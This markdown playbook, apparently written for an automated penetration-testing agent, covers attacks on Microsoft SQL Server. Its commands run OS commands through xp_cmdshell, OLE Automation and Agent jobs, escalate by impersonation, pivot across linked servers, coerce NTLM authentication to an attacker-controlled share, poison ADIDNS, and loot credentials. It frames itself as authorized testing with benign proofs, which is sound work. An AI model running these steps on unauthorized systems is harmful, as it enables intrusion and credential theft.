---
name: mssql
services: [ms-sql-s, mssql]
summary: Microsoft SQL Server — auth, privilege, code execution, linked servers, NTLM coercion
---

# MSSQL playbook

Methodology for a Microsoft SQL Server (often a high-value box, frequently a service
account with more privilege than it should have). Work it by privilege: find out who
you are, get code execution if you already can, escalate if you can't, and pivot
through linked servers and NTLM coercion to reach the rest of the domain.

The commands below are **examples** — illustrations of the right primitive and why
you'd reach for it. Compose your own queries from what each step actually returns;
they are here so the syntax is correct, not to be run verbatim.

## Guardrails
- **Read-only by default.** Prove a code-exec primitive with a benign `whoami` only —
  never a destructive write against a live service. Capture structure and a few sample
  rows; don't drop, modify, or exfiltrate real data.

## Connecting
Use `impacket_mssql`. A domain account authenticates over Windows auth; a SQL login
goes plain; a captured NTLM hash uses pass-the-hash. A `Server=…;User Id=…;Password=…`
connection string found in a binary, config file, or share IS the way in.
- Example (domain): `impacket_mssql(target, username, password, flags="-windows-auth", query="SELECT SYSTEM_USER")`
- Example (SQL login): `impacket_mssql(target, username, password, query="SELECT SYSTEM_USER")`
- Example (quick check / modules): `netexec mssql <host> -u <user> -p <pass>`

## Orient — who am I?
First move: identity and privilege, because it decides everything after.
- Example: `SELECT SYSTEM_USER; SELECT USER_NAME(); SELECT IS_SRVROLEMEMBER('sysadmin');`

look for: `sysadmin = 1` → go straight to code execution. A low database role
(`USER_NAME()` = guest) still leaves the server login useful for impersonation and
linked-server pivots, so don't stop here.

## Code execution — when you're sysadmin
`xp_cmdshell` is the direct path; enable it if needed and prove it with a benign whoami.
- Example (status): `SELECT value_in_use FROM sys.configurations WHERE name = 'xp_cmdshell';`
- Example (impacket built-ins): `enable_xp_cmdshell` then `xp_cmdshell whoami`

If `xp_cmdshell` is locked down, these run as the SQL or Agent service account:
- Example (OLE Automation): `EXEC sp_OACreate 'WScript.Shell', @o OUT; EXEC sp_OAMethod @o, 'Run', NULL, 'cmd /c whoami > C:\Temp\o.txt';`
- Example (Agent job — CMDEXEC runs as the Agent service account, often more privileged): `sp_add_job` → `sp_add_jobstep @subsystem='CMDEXEC'` → `sp_start_job`

look for: a working `whoami` (record as a critical code-exec finding) and whose context it ran as.

## Privilege escalation — when you're not sysadmin
A login you can impersonate may itself be sysadmin:
- Example (find impersonatable logins): `SELECT sp2.name FROM sys.server_permissions p JOIN sys.server_principals sp1 ON p.grantee_principal_id = sp1.principal_id JOIN sys.server_principals sp2 ON p.major_id = sp2.principal_id WHERE p.permission_name = 'IMPERSONATE';`
- Example (use it): `EXECUTE AS LOGIN = 'sa'; SELECT IS_SRVROLEMEMBER('sysadmin'); REVERT;`

A TRUSTWORTHY database owned by a sysadmin lets a procedure you create run as the owner:
- Example: `SELECT name FROM sys.databases WHERE is_trustworthy_on = 1 AND name <> 'msdb';`

look for: any impersonatable login that is sysadmin, or a TRUSTWORTHY database you own.

## Linked servers — pivot to another instance under its configured identity
A linked server lets this instance run queries on another as a stored login — often
higher-priv or on a different host, so it's a top lateral path worth checking early.
List them, ask each one who you are over there, then run across it if rpc-out allows.
- Example (catalog view): `SELECT name, data_source, is_rpc_out_enabled FROM sys.servers WHERE is_linked = 1;`
- Example (stored proc): `EXEC sp_linkedservers;`
- Example (netexec): `netexec mssql <host> -u .. -p .. -M enum_links`
- Example (remote identity): `SELECT * FROM OPENQUERY([LINK], 'SELECT SYSTEM_USER, IS_SRVROLEMEMBER(''sysadmin'')');`
- Example (run across, needs rpc-out): `EXEC ('xp_cmdshell ''whoami''') AT [LINK];`
- Example (netexec exec): `netexec mssql <host> .. -M exec_on_link` / `-M link_xpcmd`

look for: a link that lands you as sysadmin on the remote (instant exec), or rpc-out enabled.

## NTLM / cleartext coercion — make the service account authenticate to you
The SQL service account can be coerced into authenticating to a UNC path you control;
capture the NetNTLMv2 and crack or relay it. A linked server may also carry a cleartext
login you can capture by making its hostname resolve to you.
- Example (coerce): `EXEC xp_dirtree '\\<your-ip>\share';` (also `xp_subdirs`, `xp_fileexist`)
- Example (capture): start responder with `run_daemon`, then `hashcat_crack` the hash
- Example (linked-server cleartext): add an A record pointing the link's hostname at you
  (ADIDNS write), run responder via `run_daemon`, then `EXEC ('SELECT 1') AT [LINK]` and
  read the login from the capture

look for: a NetNTLMv2 hash, or a cleartext SQL login in the responder capture.

## Loot & record
- Example (hunt stored secrets): `SELECT table_name, column_name FROM information_schema.columns WHERE column_name LIKE '%pass%';`
- Example (file read, sysadmin): `SELECT * FROM OPENROWSET(BULK N'C:\path\file', SINGLE_CLOB) AS x;`

`record_credential` every login/hash the moment you get it (crackable → `hashcat_crack`).
`annotate_finding`: unauthenticated/weak access (critical); confirmed code execution
(critical, benign proof); linked-server or coercion path to another host (high).
